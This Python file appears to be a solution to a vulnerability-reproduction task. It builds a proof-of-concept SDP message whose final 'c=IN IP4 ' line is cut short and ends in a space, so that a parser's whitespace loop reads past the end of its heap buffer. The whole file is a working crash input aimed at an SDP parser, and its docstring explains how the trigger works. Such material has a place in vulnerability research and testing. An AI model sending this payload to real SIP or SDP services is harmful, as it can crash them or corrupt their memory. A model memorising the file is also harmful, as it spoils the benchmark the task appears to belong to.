import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability is described as a Heap Buffer Overflow in core: parser/sdp
        where the code does not check if it is still before the end of the value.
        This typically occurs when the parser skips whitespace or searches for a delimiter
        without checking the end-of-buffer condition.
        
        We construct a valid SDP start, and append a truncated 'c=' line at the end
        that terminates with a space. This is intended to cause the parser (e.g., 
        when parsing the connection address) to advance the read pointer past the 
        buffer end in a loop like `while (*p == ' ') p++;`.
        """
        
        # Construct the PoC payload
        poc = b"v=0\r\n"
        poc += b"o=- 12345 12345 IN IP4 127.0.0.1\r\n"
        poc += b"s=Session\r\n"
        poc += b"t=0 0\r\n"
        poc += b"m=audio 10000 RTP/AVP 0\r\n"
        
        # The trigger: A connection field at the very end of the buffer, 
        # ending with a space and no CRLF.
        poc += b"c=IN IP4 "
        
        return poc